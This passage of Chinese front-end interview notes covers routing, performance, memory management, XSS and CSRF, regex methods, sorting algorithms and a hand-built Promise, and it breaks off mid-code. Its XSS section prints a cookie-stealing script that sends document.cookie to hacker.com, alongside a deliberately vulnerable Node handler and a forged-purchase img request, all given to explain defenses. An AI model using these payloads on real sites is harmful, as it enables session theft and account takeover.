注意： `pushState()` 不会造成 `hashchange` 事件调用, 即使新的URL和之前的URL只是锚的数据不同。

#### 两种模式对比

| 对比     | Hash                           | History          |
| -------- | ------------------------------ | ---------------- |
| 路径     | 带`#`, 路径丑                  | 正常路径         |
| 兼容性   | >=ie8                          | >=ie10           |
| 实用性   | 直接使用，无需服务端配合处理。 | 需服务端配合处理 |
| 命名空间 | 同一document                   | 同源             |
| 锚点     | 导致锚点功能失效               | 锚点功能正常     |

### 前端路由实践

`vue-router`/`react-router` 都是基于前端路由的原理实现的 `react-router`常用的 `history` 有三种形式:

- `browserHistory`: **使用浏览器中的History API 用于处理 URL**。history 在 DOM 上的实现，用于支持 HTML5 history API 的浏览器。
- `hashHistory`: **使用 URL 中的 hash（#）部分去创建路由**。history 在 DOM 上的实现，用于旧版浏览器。
- `createMemoryHistory`: 不会在地址栏被操作或读取，**history 在内存上的实现**，用于测试或非 DOM 环境（例如 React Native）。

## 性能优化

1. **静态资源使用CDN**

CDN是**一组分布在多个不同地理位置的 Web 服务器**。当服务器离用户越远时，延迟越高。

1. **无阻塞**

**头部内联的样式和脚本会阻塞页面的渲染**，样式放在头部并使用link方式引入，脚本放在尾部并使用异步方式加载

1. **压缩文件**

压缩文件可以减少文件下载时间。

- **在 `webpack` 可以使用如下插件**进行压缩： JavaScript：`UglifyPlugin` CSS ：`MiniCssExtractPlugin` HTML：`HtmlWebpackPlugin`
- **使用 `gzip` 压缩**。通过向 HTTP 请求头中的 `Accept-Encoding` 头添加 `gzip` 标识来开启这一功能。

1. **图片优化**

- **图片懒加载**：对![img]()标签的`src`属性下手，在没进入可视区域的时候，先不给这个![img]()标签赋`src`属性
- **响应式图片**：浏览器根据屏幕大小自动加载合适的图片。
- **降低图片质量**：方法有两种，一是通过 `webpack` 插件 `image-webpack-loader`，二是通过在线网站进行压缩。

1. **减少重排和重绘**（见重绘和回流）
2. **使用 `requestAnimationFrame` 来实现视觉变化**

`window.requestAnimationFrame()` 告诉浏览器——你希望执行一个动画，并且**要求浏览器在下次重绘之前调用指定的回调函数更新动画**。该方法需要传入一个回调函数作为参数，该回调函数会在浏览器下一次重绘之前执行

1. **使用`webpack`对项目打包，添加文件缓存**

index.html 设置成 `no-cache`，这样每次请求的时候都会比对一下 index.html 文件有没变化，如果没变化就使用缓存，有变化就使用新的 index.html 文件。 其他所有文件一律使用长缓存，例如设置成缓存一年 `maxAge: 1000 * 60 * 60 * 24 * 365`。 前端代码使用 `webpack` 打包，**根据文件内容生成对应的文件名**，每次重新打包时只有内容发生了变化，文件名才会发生变化。

> - max-age: 设置缓存存储的最大周期，超过这个时间缓存被认为过期(单位秒)。在这个时间前，浏览器读取文件不会发出新请求，而是直接使用缓存。
> - 指定 no-cache 表示客户端可以缓存资源，每次使用缓存资源前都必须重新验证其有效性

## 内存管理机制

### JS内存的生命周期

JS 的内存生命周期，和大多数程序语言一样，分为三个阶段。

1. 分配内存
2. 内存的读与写
3. 内存的释放

### 堆内存和栈内存

不同的数据类型，系统为它开辟不同类型的内存空间，内存空间有堆内存和栈内存两种类型

- JS的**基本类型**的Number，String，Boolean，null，undefined，Symbol。这些数据类型具有**大小固定、体积轻量、相对简单**的特点，因此存储于**栈内存**中。
- 剩下的**引用类型**，比如 Object、Array、Function 等等等等。这类数据**比较复杂、占用空间较大、且大小不定**，它们被放在 JS 的**堆内存**里存储。

堆和栈分别是不同的数据结构。**栈是线性表的一种，而堆则是树形结构**。

栈内存和堆内存**读取数据方式的区别**：

![image-20210423211311813](https://gitee.com/lu_jianping/the-front-end-knowledge/raw/master/JS%E9%9A%BE%E7%82%B9.assets/image-20210423211311813.png)

在访问 a、b、c 三个变量（**基本数据结构**）时，过程非常简单：**从栈中直接获取该变量的值。**

而在访问 d 和 e （**复杂数据结构**）时，则需要分两步走：

1. 从栈中获取变量对应对象的引用（即它在堆内存中的地址）
2. 拿着 1 中获取到的地址，再去堆内存空间查询，才能拿到我们想要的数据

### 垃圾回收机制

垃圾回收机制是内存的释放阶段的一种内存时候需要被释放的判别机制。

每隔一段时间，JS 的垃圾收集器就会对变量做 “巡检”。当它判断一个变量不再被需要之后，它就会把这个变量所占用的内存空间给释放掉，这个过程叫做**垃圾回收**。

垃圾回收算法有两种 —— **引用计数法**和**标记清除法**。

#### 引用计数法

这是最初级的垃圾回收算法，它在现代浏览器里几乎已经被淘汰得干干净净。

**概念：**

在 “引用计数法” 中，“引用” 这个概念，其主语也正是 JS 环境中的**所有实体**。当我们用一个变量指向了一个值，那么就创建了一个针对这个值的 “引用”。

**在引用计数法的机制下，内存中的每一个值都会对应一个引用计数。当垃圾收集器感知到某个值的引用计数为 0 时，就判断它 “没用” 了，随即这块内存就会被释放。**

**缺陷：**

引用计数法无法甄别**循环引用**场景下的 “垃圾”！

如果任由 cycleObj1、cycleObj2 这样的变量肆虐内存，那么内存泄漏将是不可避免的结局。

```
function badCycle() {
  var cycleObj1 = {}
  var cycleObj2 = {}
  cycleObj1.target = cycleObj2
  cycleObj2.target = cycleObj1
}

badCycle()
```

#### 标记清除法

标记清除法是现代浏览器的标准垃圾回收算法。

**概念：**

在标记清除算法中，一个变量是否被需要的判断标准，是**它是否可抵达**。

（当变量进入环境时，就将这个变量标记为“进入环境”。从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。而当变量离开环境时，则将其标记为“离开环境”。）

这个算法有两个阶段，分别是**标记阶段**和**清除阶段**：

- 标记阶段：垃圾收集器会先找到根对象，在浏览器里，根对象是 Window；在 Node 里，根对象是 Global。**从根对象出发，垃圾收集器会扫描所有可以通过根对象触及的变量，这些对象会被标记为 “可抵达”**。
- 清除阶段： **没有被标记为 “可抵达” 的变量，就会被认为是不需要的变量，这波变量会被清除**。

### 内存泄漏

**概念：**

**本该释放的变量没有被释放掉，仍然占据着该内存位置，导致系统的内存占用不断攀升**，带来性能恶化、系统崩溃等一系列问题，这种现象就叫内存泄漏。

事实上，单纯由闭包导致的内存泄漏，极少极少（除非你的操作极其不规范，但那就不是闭包的问题了，是代码写得有问题）。真正导致内存泄漏的原因，我们还需要从其他方面来看。见闭包章节的注意点。

**内存泄漏的常见误操作：**

1. **“手滑” 导致的全局变量**

```
function test() {
  me = 'xiuyan'
}
```

当你在非严格模式下写代码时，`me` 而非 `var me` 这种写法，会导致这个 me 被默默地挂载到全局对象上。

根据我们前面所讲的垃圾回收策略，本来 me 这个变量，如果被 `var` 声明过，它作为函数作用域内的变量，在函数调用结束后就会消失 —— 这也是我们所期望的。但现在它是一个全局变量了，永远无法被清除。这样的变量一多，问题就来了。

1. 忘记清除的 `setInterval` 和 `setTimeout`

我们在实现轮询效果时，会用到 `setInterval`：

```
setInterval(function() {
    // 函数体
}, 1000);
```

或者链式调用 `setTimeout`：

```
setTimeout(function() {
  // 函数体
  setTimeout(arguments.callee, 1000);
}, 1000);
```

在 `setInterval` 和链式调用的 `setTimeout` 这两种场景下，定时器的工作可以说都是无穷无尽的。**当定时器囊括的函数逻辑不再被需要、而我们又忘记手动清除定时器时，它们就会永远保持对内存的占用。**因此当我们使用定时器时，一定要先问问自己：我打算什么时候干掉这玩意儿？

1. 清除不当的 DOM

```
const myDiv = document.getElementById('myDiv')

function handleMyDiv() {
    // 一些与myDiv相关的逻辑
}

// 使用myDiv
handleMyDiv()

// 尝试”删除“ myDiv
document.body.removeChild(document.getElementById('myDiv'));
```

移除节点的写法并不足以对 myDiv 这个 DOM 进行删除。这种想法非常天真，**因为 myDiv 这个变量对这个 DOM 的引用仍然存在，它仍然是一块 “可抵达” 的内存。**

## 浏览器安全

### XSS 漏洞

XSS，中文全称为跨站脚本攻击，英文全称为 Cross-Site Scripting。XSS 是目前在 Web 应用程序中发现的最为普遍的漏洞，其表现为各种形式，但是可以分为三种类型：

#### **非持久型 XSS (反射型 XSS)漏洞**

最常见的 XSS 漏洞类型，是**基于web应用中已知的漏洞，服务端，或者依赖的插件系统**。利用其中一种方式，攻击者可以**把恶意内容放进目标站点传输的内容中**。当这种**结合的内容**到达**客户端的浏览器**中，它就已经变成从受信任的来源传输的，然后在系统授权下进行操作。通过寻找把恶意脚本注入web页面的方法，攻击者可以**获取对敏感页面的访问权限**，例如对session cookie和浏览器代表用户维护的其他信息。跨站脚本攻击是代码注入的一种方式。

常见于**HTTP查询参数**(例如，HTML表单提交)，服务端脚本在没有正确过滤请求时，就立即解析并展示页面结果给用户。因为html文档是流式结构并且混合了控制状态，格式化，真实内容，结果页面中包含的任何未经验证的用户提交数据，如果**没有正确的进行html编码，都有可能导致标签注入**。

一个典型例子是一个网站搜索引擎：如果搜索了一个字符串，这个搜索字符串通常会在搜索页再显示一次，告诉用户搜索了什么。如果响应没有正确忽略或者拒绝html控制字符串，跨站脚本风险随之而来。

**例子：**

假设用户在搜索框中输入关键词，然后点击搜索，页面将会跳转到：

```
https://www.taobao.com/search?keyword=xxx
```

又假设服务器处理这个请求的代码是：

```
const http = require('http')
const url = require('url');
const port = 3000

const requestHandler = (request, response) => {
  const queryObject = url.parse(request.url,true).query;
  const keyword = queryObject.keyword
  response.end(`<body>
The keyword is: ${keyword}
</body>`)
}

const server = http.createServer(requestHandler)

server.listen(port, (err) => {
})
```

如果用户这样请求：

```
https://www.taobao.com/search?keyword=%3Cscript%3Ealert(%22123%22)%3C/script%3E
```

可以看到 keyword 字段的值是一段 JavaScript 脚本，这时候这段脚本就会在页面渲染时被插入页面，进而执行script内的代码。

**获取cookie**

在大多数情况下，cookie 是验证用户身份的唯一凭证，等同于用户名密码。如果这个 cookie 被人窃取了，那么在其有效时间内，就相当于用户名和密码被窃取了。

1. 攻击者通过某种方法 (如 QQ 中冒充好友、垃圾邮件等)，诱使用户点击以下URL：

   ```
   https://www.taobao.com/search?keyword=<script>const%20image%20%3D%20new%20Image%3Bimage.src%3D%27http%3A%2F%2Fhacker.com%2F%27%2Bdocument.cookie<%2Fscript>
   ```

显然后面带的 keyword 是一个脚本，其反转义后如下：

```
<script>const image = new Image;image.src='http://hacker.com/'+document.cookie</script>
```

用户点击上面那个链接后，由于淘宝网有 XSS 漏洞，所以这段脚本会在服务器被拼接在页面之中并返回给浏览器，浏览器会执行这段脚本。这个脚本将会携带着目前域的 cookie 值向黑客网站 [http://hacker.com](http://hacker.com/) 发送一个请求，这样黑客就会获知此用户宝贵的 cookie 值。

1. 黑客得到用户 cookie 中的登陆令牌后，携带令牌访问用户的隐私信息

这种 XSS 漏洞叫作反射型 XSS 的原因是：**用户通过点击黑客给的危险链接，将危险脚本传到服务器上，服务器又反过来将危险脚本返还给浏览器，这是一个反射的过程**。

#### 存储型XSS

持久型(又称存储型)XSS漏洞是一种**更有破坏性的跨站脚本缺陷的变种**：当攻击者提供的数据保存到了服务端，然后永久的显示在“正常”页面，并且其他用户在浏览器是可以看到，如果这些数据没有经过正确的html编码，就会发生这种攻击。

一个典型的例子就是在线留言板，允许用户发布html格式的信息，可以让其他用户看到。

![图片描述](http://img1.sycdn.imooc.com/5e683b0c0001314613800512.png) 当其他用户浏览这个商品的评价时，页面会携带黑客的 "危险脚本"版评论拼接成评价页面，所以这个危险脚本就会在用户打开商品评价页面时执行，黑客就可以获得用户的 cookie 值了

一般情况下，利用保存型 XSS 漏洞的攻击**至少需要向服务器提出两个请求**，第一个请求时是传送包含危险脚本的请求，这个请求可以**将危险脚本存储在服务器中**，第二个请求是**受害者查看包含危险脚本的页面，此时危险脚本开始执行**。

**反射型与保存型 XSS 在实施步骤上存在两个重要区别：**

1. 反射型 XSS 脚本攻击中，攻击者必须以某种方式诱骗受害者点击他设计的 URL。而保存型 XSS 脚本攻击没有这种要求，攻击者所需要做的就是将危险脚本存储在目标服务器中，然后等待受害者打开包含危险脚本的页面就行了
2. 黑客能够劫持到 cookie 的前提是：浏览器中存在 cookie。这意味着，在反射型 XSS 脚本攻击中，即使黑客费尽千辛万苦让用户点击了那个恶意链接，如果用户没有在该网站登陆过，也就是说该网站上中没有用户的 cookie，那就前功尽弃了；但是在保存型 XSS 攻击中，大部分查看淘宝评论的用户都处于登陆状态，就可以保证窃取 cookie 的成功率了。

因为这两点重要区别，保存型 XSS 一般能造成更大的伤害。

#### DOM XSS 漏洞

反射型和保存型 XSS 的一个共同特点是：它们最终都依赖于服务端将包含危险脚本的页面返回给用户。而 DOM XSS 漏洞的特点就是，它并不依赖与服务器，它是一个纯前端的 XSS 漏洞。

假设其前端页面源代码是这样：

```
<html>
<body>
<div id="div"/>
<script>
  var url_string = location.href; //window.location.href
  var url = new URL(url_string);
  var keyword = url.searchParams.get("keyword");
  document.write(`search keyword: ${keyword}`)
</script>
</body>
</html>
```

也就是说，keyword的值不依赖于服务器拼接，而直接在前端拼接。

此时黑客故技重施，诱骗用户点击如下恶意链接：

```
https://www.taobao.com?keyword=%3Cscript%3Econst%20image%20%3D%20new%20Image%3Bimage.src%3D%27http%3A%2F%2Fhacker.com%2F%27%2Bdocument.cookie%3C%2Fscript%3E
预览
```

恶意链接后面的代码会直接被前端代码处理，然后作为脚本被插入到页面中并执行。

#### cookie 的同源保护

由于同源策略的保护，某域的cookie只有在该域下才能够被访问，在跨域网站上脚本是无法访问的。这使得黑客不得不利用 XSS 漏洞在本域上执行脚本，而不是直接在自己的网站 [hacker.com](http://hacker.com/) 上执行。

#### 防止XSS漏洞攻击

1. 对内容进行转义

   所有的 XSS 攻击，最终都要落实在 “让页面把`<script>`脚本当作普通文本来渲染” 这一点上，所以在前端渲染动态内容时应该**对内容进行转义**。

   在页面中的 JavaScript 脚本中还要小心`eval()` 、`setTimeout()` 、`setInterval()` 等方法，传入的字符串一定要进行转义，因为它们都能把字符串当作代码运行，如：

   ```
   setTimeout('console.log(123)',1000)
   ```

   总体来说，最主要的是要转义以下三个字符：

   ```
   1. &lt; (<)
   
   2. &gt; (>)
   
   3. &amp; (&)
   ```

2. 利用 HTTP-only Cookie，对于某些**敏感 cookie 仅允许HTTP请求读取，不运行 JavaScript 读取**。

3. CSP，英文全拼为Content Security Policy，其设计的一个重要目的就是为了防止 XSS 攻击。有两种方法可以设置 CSP，一种是通过 Response Header，还有一种是网页的`<meta>`标签，配置 CSP 可以**指定页面中可以执行脚本的来源**，比如完全禁止页面中的内联脚本，这是最有效的预防 XSS 的方法。但是这也会带来一些开发的不方便，这就需要开发者在安全性与便捷性之间进行权衡。

### CSRF 漏洞

CSRF，英文全拼为 Cross Site Request Forgery，中文是跨站请求伪造。其攻击方式为在受害者不知情的情况下使受害者发送请求至目标服务器。想象这样的场景：

1. 受害者打开`https://www.taobao.com` 然后登录，淘宝中有个 GET 请求为：

   https://www.taobao.com/buy1GoldFor?name=XXX

其中 XXX 为一个淘宝用户名，当受害者调用这个这个 API 后就他就为 XXX 用户购买了一块黄金。

1. 黑客诱导受害者打开`https://www.hacker.com` ，此网站中有一个`img` 标签，标签如下：

   ```
   <img src="https://www.taobao.com/buy1GoldFor?name=hacker">
   ```

2. 由于`img`的 src 不受同源策略的约束，当受害者打开`https://www.hacker.com`时，就像淘宝发送了买黄金的请求，由于在浏览器中已经有了淘宝网的 cookie，所以黑客成功达成了 “冒充受害者给自己买黄金” 的结果。

**解读**：

可以看出，黑客并不通过 CSRF 来获得用户账号的控制权，也不窃取任何东西，而只是在用户不知情的情况下让用户自己进行黑客想要的操作。

#### 如何预防 CSRF 攻击？

1. Referer Check

HTTP头中有一个字段叫作`Referer`，它记录了HTTP请求来源的地址。比如请求来源于`https://www.taobao.com`，`Referer`的值就为`https://www.taobao.com` 。所以，淘宝网可以在服务端增加这样一个检查：

```
if (req.headers.referer !== 'https://www.taobao.com/') {
    res.write('refuse');
    return;
}
```

1. 添加 token 验证

CSRF 攻击的核心在于利用用户请求时携带的 cookie 令牌信息来冒充用户，为了防止被冒充，可以**在每个请求中以参数的形式加入一个随机产生的 token**，然后在服务端验证这个 token 的正确性。这样使用 CSRF 攻击偷偷发送的请求就不会通过验证了。

1. 验证码

给敏感请求加上验证码可以保证用户对这些敏感请求是知晓的，但是验证码也会给用户带来不便，所以开发者需要进行权衡

### 跨域问题、浏览器同源策略及原因

域 = 协议+域名+端口号，例 [https://www.csdn.net:8080](https://www.csdn.net:8080/) 跨域问题其实就是在一个域里请求其他域时出现的无法请求的问题。

#### **跨域问题的原因（浏览器同源策略）**

> 同源策略是一个重要的安全策略，它用于限制一个origin的文档或者它加载的脚本如何能与另一个源的资源进行交互。它能帮助阻隔恶意文档，减少可能被攻击的媒介。 [MDN 浏览器同源策略](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy)

同源策略控制不同源之间的交互，例如在使用[`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 或 [``](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/img) 标签时则会受到同源策略的约束。这些交互通常分为三类：

- 跨域***写操作**（Cross-origin writes）*一般是被允许的*。*例如链接（links），重定向以及表单提交。特定少数的HTTP请求需要添加 [preflight](https://developer.mozilla.org/zh-CN/docs/HTTP/Access_control_CORS#Preflighted_requests)。
- 跨域***资源嵌入**（Cross-origin embedding）*一般是被允许（后面会举例说明）。
- 跨域***读操作**（Cross-origin reads）*一般是不被允许的*，*但常可以通过内嵌资源来巧妙的进行读取访问。例如，你可以读取嵌入图片的高度和宽度，调用内嵌脚本的方法，或[availability of an embedded resource](https://grepular.com/Abusing_HTTP_Status_Codes_to_Expose_Private_Information).

简单点说，就是浏览器为了安全起见，它不允许不同域的文档或者脚本进行交互。

当然，对于前后端分离的今天，前后端分别运行在不同的机器上，每当我们请求后端的数据都会出现跨域问题，这当然是不行的。

**如果浏览器没有同源策略会出现的问题**

1. 如果没有DOM同源策略
   1. 做一个假网站，通过iframe嵌套一个真实的银行网站
   2. 让iframe的宽高挤满整个屏幕，这样看起来与真实的网站没有区别，实际上它就是真实的网站。
   3. 用户输入用户名、密码的时候，主网站可以访问银行网站的DOM结点，从而拿到用户名、密码。
2. 如果没有XMLHttpRequest同源策略（XMLHttpRequest对象是用于在后台和服务器交换数据的）
   1. 现在你访问了一个网站比如[http://www.1.com，这个网站会将一些用户标识存在你的本地cookie以便于下次直接登录。](http://www.1.xn--com%2Ccookie-tf2pke1q10cnfu9brzac0b11c079e3ea494gjsdj90az4qkyijyydpfl7z1x2e2ui2hn6k2w9b8x6amz7gkr5a./)
   2. 现在你从[http://www.2.com访问http://www.1.com，浏览器会默认把http://www.1.com的cookie发送给它](http://www.2.xn--comhttp-816un48d//www.1.com，浏览器会默认把http://www.1.com的cookie发送给它)

#### 跨域问题的解决

## 正则表达式

### test、exec、 match 这三个方法的用法

> RegExp.prototype.test

test是JavaScript中正则表达式对象的一个方法，用来**检测正则表达式对象与传入的字符串是否匹配**，若匹配返回true，若不匹配返回false

由于`test`方法的返回值只是一个boolean值，所以括号在test方法中唯一的作用就是分组，如：

```
/123{2}/.test('123123') // false
/(123){2}/.test('123123') // true
```

> String.prototype.match

match方法是字符串的方法，传入参数为正则表达式，返回字符串匹配正则表达式的结果。括号在match方法中有两个作用：

- 分组
- 捕获。捕获的意思是将用户指定的匹配到的子字符串暂存并返回给用户。

```
'123123'.match(/123{2}/) // null
'123123'.match(/(123){2}/) // ["123123", "123", index: 0, input: "123123", groups: undefined]
```

当传入的正则表达式**没有使用g标志**时，其返回一个数组，数组第一个值为第一个完整匹配，后续的值分别为括号捕获的所有值，且此数组含有以下三个属性：

- groups，命名捕获组
- index，匹配结果的开始下标
- input，传入的原始字符串

在`match`方法中，当传入的正则表达式**有 g 标志时，将返回所有与正则表达式匹配的结果，忽略捕获**

> RegExp.prototype.exec

exec方法是正则表达式的方法，**传入参数为字符串，返回字符串匹配正则表达式的结果**。当正则表达式没有g标志时，其返回值与String.prototype.match()没有g标志时返回的结果一样

```
'123123'.match(/(123){2}/) // ["123123", "123", index: 0, input: "123123", groups: undefined]
/(123){2}/.exec('123123')  // ["123123", "123", index: 0, input: "123123", groups: undefined]
```

当正则表达式有 g 标志时，可以**多次执行 exec 方法来查找同一个字符串中的成功匹配**（多次查找匹配的值不重复）。如：

```
var html = "123123";
var tag = /(12)3/g
var match, arr = []
do {
  if (match) arr.push(match)
  match = tag.exec(html)
} while (match)

console.log(arr[0]) // ["123", "12", index: 0, input: "123123", groups: undefined]
console.log(arr[1]) // ["123", "12", index: 3, input: "123123", groups: undefined]
console.log(arr[2]) // undefined
```

`exec`方法中的括号用法与`match`方法相同。

## 手撕系列

### 排序

**冒泡排序**

```
function bubbleSort(arr) {
  const len = arr.length;
  for (let i = 0; i < len - 1; i++) {
    for (let j = i + 1; j < len; j++) {
      if (arr[j] < arr[i]) {
        [arr[j], arr[i]] = [arr[i], arr[j]];
      }
    }
  }
  return arr;
}
```

**选择排序**

选择排序(Selection-sort)是一种简单直观的排序算法。它的工作原理：首先在未排序序列中**找到最小（大）元素**，**存放到排序序列的起始位置**，然后，**再从剩余未排序元素中继续寻找最小（大）元素**，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。

```
function selectionSort(arr) {
  const len = arr.length;
  for (let i = 0; i < len - 1; i++) {
    let index = i;
    for (let j = i + 1; j < len; j++) {
      if (arr[j] < arr[index]) {
        index = j;
      }
    }
    if (index !== i) {
      [arr[i], arr[index]] = [arr[index], arr[i]];
    }
  }
  return arr;
}
```

**插入排序**

插入排序（Insertion-Sort）的算法描述是一种简单直观的排序算法。它的工作原理是**通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入**。

插入排序在实现上，通常采用in-place排序（即只需用到**O(1)\**的额外空间的排序），因而在从后向前扫描过程中，需要反复把已排序元素\**逐步向后挪位**，为最新元素提供插入空间。

```
function insertionSort(arr) {
  const len = arr.length;
  for (let i = 1; i < len; i++) {
    let j = i - 1;
    const value = arr[i];
    while (arr[j] > value && j >= 0) {
      arr[j + 1] = arr[j];
      j--;
    }
    arr[j + 1] = value;
  }
  return arr;
}
```

**归并排序**

归并排序是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。归并排序是一种**稳定的排序方法**。**先使每个子序列有序，再使子序列段间有序**。若将两个有序表合并成一个有序表，称为2-路归并。

```
function mergeSort(arr) {  //采用自上而下的递归方法
  var len = arr.length;
  if (len < 2) return arr;

  const middle = Math.floor(len / 2);
  let left = arr.slice(0, middle);
  let right = arr.slice(middle);
  return merge(mergeSort(left), mergeSort(right));
}

function merge(left, right) {
  let result = [];
  while (left.length && right.length) {
    if (left[0] <= right[0]) {
      result.push(left.shift());
    } else {
      result.push(right.shift());
    }
  }
  return result.concat(left).concat(right);
}
```

**快速排序**

快速排序的基本思想：通过一趟排序将待排记录分隔成独立的两部分，**其中一部分记录的关键字均比另一部分的关键字小**，则可**分别对这两部分记录继续进行排序**，以达到整个序列有序。

```
function quickSort(arr) {
  if (arr.length <= 1) return arr;
  const pivotIndex = Math.floor(arr.length / 2);
  const pivot = arr.splice(pivotIndex, 1)[0];
  let left = [];
  let right = [];
  for (let i = 0; i < arr.length; i++){
    if (arr[i] < pivot) {
      left.push(arr[i]);
    } else {
      right.push(arr[i]);
    }
  }
  return quickSort(left).concat([pivot], quickSort(right));
};
```

### 防抖和节流

**背景**：

在各种各样的浏览器事件中，有一类特别需要大家关注的事件：那些容易**过度触发的事件**。

比如scroll 事件，它就是一个非常容易被反复触发的事件。其实不止 scroll 事件，resize 事件、鼠标事件（比如 mousemove、mouseover 等）、键盘事件（keyup、keydown 等）都存在被频繁触发的风险。

**频繁触发回调导致的大量计算会引发页面的抖动甚至卡顿**。为了规避这种情况，我们需要一些手段来控制事件被触发的频率。就是在这样的背景下，throttle（事件节流）和 debounce（事件防抖）出现了。

**注意**：

1. 保存上下文this指向，调用的时候不应该丢失原来的this引用
2. timer定时器的`lastTime`的记录使用闭包特性来记录

#### 防抖（最后一个人说了算）

**防抖**：当你在频繁调用方法时，并不会执行，只有当你在**指定间隔内没有再调用**，才会执行函数。

```
function debounce(fn, wait) {
    let timer = null;
    
    return function () {
        // 保存上下文的this指向
        const context = this;
        // 保存函数调用的参数args
        const args = arguments;
        
        // 若timer还在，说明指定间隔内，清空timer定时器并置空timer
        if (timer) {
            clearTimeout(timer);
            timer = null;
        }
        
        // 设置定时器，回调为原函数的执行
        timer = setTimeout(() => {
            fn.apply(context, args);
        }, wait);
    }
}
```

#### 节流（第一个人说了算）

**节流**：**在一个单位时间内，只能触发一次函数**。如果这个单位时间内触发多次函数，只有一次生效。

```
function throttle(fn, wait) {
    // 保存上次函数调用的时间,利用闭包来记录上次的调用时间
    let lastTime;
    
    return function () {
        // 保存上下文的this指向
        const context = this;
        // 保存函数调用的参数args
        const args = arguments;
        
        // 保存当前的时间
        let nowTime = new Date();
        // 注意第一次lastTime变量为空的情况
        if (nowTime - lastTime > wait || !lastTime) {
            fn.apply(context, args);
            // 更新lastTime时间变量
            lastTime = nowTime;
        }
    }
}
```

### Event Bus

![image-20210506145130699](https://gitee.com/lu_jianping/the-front-end-knowledge/raw/master/JS%E9%9A%BE%E7%82%B9.assets/image-20210506145130699.png)

主要流程：

1. 创建一个 Map（对应示例代码中的 handlers），它的作用是保存事件名称和函数之间的映射关系
2. on 事件监听方法的基本逻辑：如果 Map 中已经有此事件，则意味着对应的方法数组已存在，直接push到方法数组中；如果 Map 没有此事件， 则初始化事件监听函数队列。
3. emit 事件订阅方法的基本逻辑：检查对应事件的监听函数队列是否存在，若存在，则逐个调用队列里的回调函数。

```
class EventEmitter {
  constructor () {
    // 初始化一个handler，是一个map，用来映射事件和回调的关系
    this.handlers = {};
  }

  // on方法用于安装事件监听器，它接收目标事件名和回调函数作为参数
  on (eventName, cb) {
    if (!this.handlers[eventName]) this.handlers[eventName] = [];
    this.handlers[eventName].push(cb);
  }

  // emit方法用于触发目标事件，它接收事件名和监听函数的入参作为参数
  emit (eventName, ...args) {
    if (this.handlers[eventName]) {
      this.handlers[eventName].forEach(cb => {
        cb(...args);
      })
    }
  }
}

const event1 = new EventEmitter();

event1.on('sing', (geci) => {
  console.log('喔哦' + geci);
})

event1.on('sing', (geci) => {
  console.log('skr' + geci);
})

setTimeout(() => {
  event1.emit('sing', '青涩等言语');
}, 2000);
```

### Promise

#### Promise/A+规范

1. **executor与三种状态**

- 可以接收一个 executor 作为入参
- 具备 pending、resolved 和 rejected 这三种状态

```
function CutePromise(executor) {
    // value 记录异步任务成功的执行结果
    this.value = null;
    // reason 记录异步任务失败的原因
    this.reason = null;
    // status 记录当前状态，初始化是 pending
    this.status = 'pending';
     
    // 把 this 存下来，后面会用到
    var self = this;
  
    // 定义 resolve 函数
    function resolve(value) {
        // 异步任务成功，把结果赋值给 value
        self.value = value;
        // 当前状态切换为 resolved
        self.status = 'resolved'; 
    }
    
    // 定义 reject 函数
    function reject(reason) {
        // 异步任务失败，把结果赋值给 value
        self.reason = reason; 
        // 当前状态切换为 rejected
        self.status = 'rejected';
    }
  
    // 把 resolve 和 reject 能力赋予执行器
    executor(resolve, reject);
}
```

1. **then方法的行为**

每一个 promise 实例一定有个 then 方法，因此 then 方法应该装在 Promise 构造函数的原型对象上

```
CutePromise.prototype.then = function (onResolved, onRejected) {
  // 参数的规范化处理，若 onResolved 和 onRejected 不是函数，用一个透传函数封装
  if (typeof onResolved !== 'function') onResolved = function (x) { return x };
  if (typeof onRejected !== 'function') onRejected = function (e) { throw e };

  // 保存this
  var self = this;
  // 根据状态执行相应的函数
  if (self.status === 'resolved') {
    onResolved(self.value);
  } else if (self.status === 'rejected') {
    onRejected(self.reason);
  }
}
```

1. **考虑异步执行resolve的情况**（不具备链式调用的能力）

```
function CutePromise(exector) {
  // 异步任务执行成功的结果
  this.value = null;
  // 异步任务执行失败的原因
  this.reason = null;
  // 当前promise的状态
  this.status = 'pending';
  // promise待执行的resolve函数
  this.resolveTask = null;
  // promise待执行的reject函数
  this.rejectTask = null;
  // 记录this，保证this的指向
  var self = this;

  // 定义resolve函数
  function resolve (data) {
    // 这里要用self而不是this，因为是在外部被调用
    self.value = data;
    self.status = 'resolved';
    if (self.resolveTask) self.resolveTask(self.value);
  }

  // 定义reject函数
  function reject (reason) {
    self.reason = reason;
    self.status = 'rejected';
    if (self.rejectTask) self.rejectTask(self.reason);
  }

  // 传递resolve和reject函数给executor并执行
  exector(resolve, reject);
}

CutePromise.prototype.then = function (onResolved, onRejected) {
  // 参数的规范化处理，若 onResolved 和 onRejected 不是函数，用一个透传函数封装
  if (typeof onResolved !== 'function') onResolved = function (x) { return x };
  if (typeof onRejected !== 'function') onRejected = function (e) { throw e };

  // 保存this
  var self = this;
  // 根据状态执行相应的函数
  if (self.status === 'resolved') {
    onResolved(self.value);
  } else if (self.status === 'rejected') {
    onRejected(self.reason);
  } else if (self.status === 'pending') {
    self.resolveTask = onResolved;
    self.rejectTask = onRejected;
  }
}

new CutePromise(function(resolve, reject){
  setTimeout(() => {
    resolve('成了！');
  }, 1000);
}).then(function(value){
  console.log(value);
}, function(reason){
  console.log(reason);
});

// 输出 “成了！”

new CutePromise(function(resolve, reject){
  reject('错了！');
}).then(function(value){
  console.log(value);
}, (reason) => {
  console.log(reason);
});

// 输出“错了！”
```

1. **链式调用**（没有考虑链式调用的返回值）

```
function CutePromise(exector) {
  // 异步任务执行成功的结果
  this.value = null;
  // 异步任务执行失败的原因
  this.reason = null;
  // 当前promise的状态
  this.status = 'pending';
  // promise待执行的resolve函数
  this.resolveTask = [];
  // promise待执行的reject函数
  this.rejectTask = [];
  // 记录this，保证this的指向
  var self = this;

  // 定义resolve函数
  function resolve (data) {
    // 如果不是 pending 状态，直接返回
    if (self.status !== 'pending') {
      return;
    }
    // 这里要用self而不是this，因为是在外部被调用
    self.value = data;
    self.status = 'resolved';
